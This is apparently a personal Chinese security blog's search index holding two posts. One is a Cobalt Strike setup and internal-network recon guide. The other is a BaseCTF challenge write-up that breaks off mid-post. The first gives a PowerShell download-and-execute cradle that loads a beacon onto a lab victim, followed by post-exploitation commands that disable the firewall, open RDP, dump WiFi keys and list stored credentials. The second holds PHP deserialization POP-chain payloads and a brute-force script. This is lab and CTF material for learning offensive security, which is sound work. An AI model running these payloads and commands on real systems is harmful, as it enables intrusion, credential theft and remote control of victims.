<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="cobaltStrike4-3安装"><a href="#cobaltStrike4-3安装" class="headerlink" title="cobaltStrike4.3安装"></a>cobaltStrike4.3安装</h2><p>哎，装个4.0的版本还是不行，jdk版本是11的</p><p>百度网盘：<a href="https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w">https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w</a> 提取码: n1qm </p><p>kali里面解压缩：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.23.152 123456    #kali的ip地址，密码：123456[一次性的，可以随时更改]</span><br></pre></td></tr></table></figure><p><img src="/img/1726147569177-31.png" alt="img"></p><p>windows下启动</p><p><img src="/img/1726147569175-1.png" alt="img"></p><p>成功连接</p><p><img src="/img/1726147569175-2.png" alt="img"></p><h2 id="cobaltStrike基本使用"><a href="#cobaltStrike基本使用" class="headerlink" title="cobaltStrike基本使用"></a>cobaltStrike基本使用</h2><p>准备一台肉鸡，这里我使用windows7来测试，哎，windows10好卡</p><p>cs上</p><p><img src="/img/1726147569175-3.png" alt="img"></p><p>填写主机的ip地址，开启监听即可</p><p><img src="/img/1726147569175-4.png" alt="img"></p><p>window7上输入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.5.48:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p>连接成功，输入shell whoami来执行一下</p><p><img src="/img/1726147569175-5.png" alt="img"></p><h2 id="使用CS进行本地工作组收集信息"><a href="#使用CS进行本地工作组收集信息" class="headerlink" title="使用CS进行本地工作组收集信息"></a>使用CS进行本地工作组收集信息</h2><p>Shell ipconfig,可以查看到其ip地址</p><p><img src="/img/1726147569175-6.png" alt="img"></p><p>shell systeminfo</p><p><img src="/img/1726147569175-7.png" alt="img"></p><p>查看系统结构体系结构</p><p>echo %PROCESSOR_ARCHITECTURE%</p><p><img src="/img/1726147569175-8.png" alt="img"></p><p>查看系统安装了哪些软件及版本：wmic product get name,version</p><p><img src="/img/1726147569176-9.png" alt="img"></p><p>本机运行服务：wmic service list brief</p><p><img src="/img/1726147569176-10.png" alt="img"></p><p>查看进程:tasklist</p><p><img src="/img/1726147569176-11.png" alt="img"></p><p>查看计划任务：schtasks &#x2F;query &#x2F;fo LIST &#x2F;v  [如果报错的话可以先输入chcp473改变其编码]</p><p><img src="/img/1726147569176-12.png" alt="img"></p><p>电脑开机时间：net statistics workstation</p><p><img src="/img/1726147569176-13.png" alt="img"></p><p>查看本地有几个用户：net user</p><p><img src="/img/1726147569176-14.png" alt="img"></p><p>当前会话列表：net session</p><p><img src="/img/1726147569176-15.png" alt="img"></p><p>查询端口开放信息： netstat -ano</p><p><img src="/img/1726147569176-16.png" alt="img"></p><p>查询补丁信息：依旧可以使用shell systeminfo来查看</p><p><img src="/img/1726147569176-17.png" alt="img"></p><p>查看杀毒软件信息：wmic &#x2F;namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe，目标靶机没有杀毒软件，就以我的主机为例</p><p><img src="/img/1726147569176-18.png" alt="img"></p><p>查询共享列表：net share</p><p><img src="/img/1726147569176-19.png" alt="img"></p><p>查看路由信息：route print</p><p><img src="/img/1726147569176-20.png" alt="img"></p><p>查看防火墙的禁用状态：netsh firewall show state</p><p><img src="/img/1726147569176-21.png" alt="img"></p><p>关闭防火墙的命令</p><p>Netsh firewall set opmode  disable</p><p><img src="/img/1726147569176-22.png" alt="img"></p><p>防火墙允许3389端口放行</p><p>netsh firewall set portopening TCP 3389 ENABLE</p><p><img src="/img/1726147569176-23.png" alt="img"></p><p>查看当前连接wifi密码名字</p><p>netsh wlan show profile name&#x3D;”HYNUCTF520” key&#x3D;clear</p><p><img src="/img/1726147569176-24.png" alt="img"></p><p>查看rdp端口</p><p>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp &#x2F;v PortNumber    #16进制转10进制为3389</p><p><img src="/img/1726147569176-25.png" alt="img"></p><p>查看当前凭据</p><p>cmdkey &#x2F;l</p><p><img src="/img/1726147569176-26.png" alt="img"></p><p>查看局域网所有IP信息</p><p>Arp-a </p><p><img src="/img/1726147569176-27.png" alt="img"></p><p>查看最近打开的文件</p><p>Dir %appdata%\Microsoft\Windows\Recent</p><p><img src="/img/1726147569177-28.png" alt="img"></p><p>查看本地工作组</p><p>Net localgroup</p><p><img src="/img/1726147569177-29.png" alt="img"></p><p>查看本地工作组users</p><p>Net localgroup users</p><p><img src="/img/1726147569177-30.png" alt="img"></p><p>查看rdp的保存凭据</p><p>dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials*</p><p><img src="/img/image-20240913084522181.png" alt="image-20240913084522181"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF</title>
      <link href="/2024/09/04/BaseCTF/"/>
      <url>/2024/09/04/BaseCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ez-crypto"><a href="#ez-crypto" class="headerlink" title="ez_crypto"></a>ez_crypto</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qMfZzunurNTuAdfZxZfZxZrUx2v6x2i0C2u2ngrLyZbKzx0=</span><br></pre></td></tr></table></figure><p>base64换表</p><p><img src="/img/1725763539191-10.png" alt="img"></p><h3 id="黑丝上的flag"><a href="#黑丝上的flag" class="headerlink" title="黑丝上的flag"></a>黑丝上的flag</h3><p>stegsolve查看通道</p><p><img src="/img/1725763539177-1.png" alt="img"></p><h3 id="这是一个压缩包"><a href="#这是一个压缩包" class="headerlink" title="这是一个压缩包"></a>这是一个压缩包</h3><p>压缩包爆破解密，注释里的一段base解密：</p><p>QmFzZUNURj8&#x2F;Pz8&#x2F;P0ZUQ2VzYUI&#x3D;</p><p>BaseCTF??????FTCesaB</p><p>ARCHPR爆破无解，经观察可知这个密码呈对称性</p><p>脚本直接爆破解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lowercase = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">uppercase = lowercase.upper()</span><br><span class="line">digits = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">symbols = <span class="string">&#x27;!@#$%^&amp;*()-_=+&#x27;</span></span><br><span class="line">ls = lowercase+uppercase+digits+symbols</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> t1 <span class="keyword">in</span> ls:</span><br><span class="line">        <span class="keyword">for</span> t2 <span class="keyword">in</span> ls:</span><br><span class="line">            <span class="keyword">for</span> t3 <span class="keyword">in</span> ls:</span><br><span class="line">                password = <span class="string">&#x27;BaseCTF&#x27;</span>+t1+t2+t3+t3+t2+t1+<span class="string">&#x27;FTCesaB&#x27;</span></span><br><span class="line">                f.write(password+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-2.png" alt="img"></p><p>BaseCTF_h11h_FTCesaB</p><p>BaseCTF{a7da6763-5013-4963-9c23-8fb3d049bdce}</p><h3 id="Base-revenge"><a href="#Base-revenge" class="headerlink" title="Base revenge"></a>Base revenge</h3><p>base64隐写-&gt;JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9</p><p><img src="/img/1725763539178-3.png" alt="img"></p><p>根据提示：Atbash</p><p><img src="/img/1725763539178-4.png" alt="img"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>; <span class="comment">#3.触发_tostring()魔术方法</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;  <span class="comment">#4.触发_wakeup魔术方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();         <span class="comment">#2.触发_get魔术方法，来调用getflag(),当访该类中私有或者不存在的成员属性值时调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);      <span class="comment"># 1.找到输出flag的位置，执行cat /flag，这里我们要调用getflag()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">misc</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; over = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; chu0 = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span> =<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$d</span> -&gt; kw = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;N;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>nature&#x3D;O:6:”Nature”:1:{s:3:”sea”;O:3:”Sea”:1:{s:6:”animal”;O:5:”Shark”:1:{s:6:”%00word%00”;O:4:”Sink”:1:{s:9:”%00Sink%00cmd”;s:9:”echo 123;”;}}}}</p><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><p>php反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先找到eval函数输出,可以使cmd等于system(“cat &#x2F;flag”)进行命令执行，即我们要触发tostring()函数</p><p>这里我们可以看见类Shark里面的有个私有属性word里包含一个字符串，可以尝试在这里进行触发tostring()</p><p>但是私有属性不能够直接调用,直接进行内部赋值(之前是这里不会)，之后直接触发invoke(),当对象调用函数时触发，这里我们看见类Sea里的animal,将Sea里的animal调用给Shark即可触发invoke()，之后就是_get()魔术方法的触发，从不可访问的属性里读取数据，这里我们直接调用类Nature里的sea给$sea即可，触发destruct().</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setWord</span>(<span class="params"><span class="variable">$word</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word = <span class="variable">$word</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nature</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$sea</span> = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$sink</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"><span class="variable">$shark</span> = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$sea</span>-&gt;animal = <span class="variable">$shark</span>;</span><br><span class="line"><span class="variable">$nature</span>-&gt;sea = <span class="variable">$sea</span>;</span><br><span class="line"><span class="variable">$shark</span>-&gt;<span class="title function_ invoke__">setWord</span>(<span class="variable">$sink</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nature</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h3><p>题目提示：每一道题目需要在 5 秒内解出, 传入到 <code>$_POST[&#39;answer&#39;]</code> 中, 解出 50 道即可, 除法取整</p><p><img src="/img/1725763539178-5.png" alt="img"></p><p>考察使用python的request来编写脚本进行计算</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设这是你接收到的算式和答案的URL</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge.basectf.fun:21216/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">payload = &#123;<span class="string">&#x27;answer&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">response = s.post(url)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># 模拟50次POST请求</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    response_text = response.text</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    start_index = response_text.find(<span class="string">&#x27;second &#x27;</span>) + <span class="number">7</span>  <span class="comment"># 7是&quot;second &quot;的⻓度</span></span><br><span class="line">    end_index = response_text.find(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    expression = response_text[start_index:end_index]</span><br><span class="line">    partten = <span class="string">r&#x27;÷&#x27;</span></span><br><span class="line">    expression = re.sub(partten, <span class="string">&#x27;//&#x27;</span>, expression)</span><br><span class="line">    partten = <span class="string">r&#x27;×&#x27;</span></span><br><span class="line">    expression = re.sub(partten, <span class="string">&#x27;*&#x27;</span>, expression)</span><br><span class="line">    <span class="comment"># 计算结果</span></span><br><span class="line">    <span class="built_in">print</span>(expression)</span><br><span class="line">    answer = <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line">    <span class="comment"># 发送POST请求</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;answer&#x27;</span>: answer&#125;</span><br><span class="line">    response = s.post(url, data=payload, cookies=response.cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-6.png" alt="img"></p><p>BaseCTF{2112aa5d-5928-4a13-bca4-d9b621cb027b}</p><h3 id="所以你说你懂-MD5"><a href="#所以你说你懂-MD5" class="headerlink" title="所以你说你懂 MD5?"></a>所以你说你懂 MD5?</h3><p>考察知识点：md5 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 所以你说你懂 MD5 了?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;加强难度就不会了?&#x27;</span>);</span><br><span 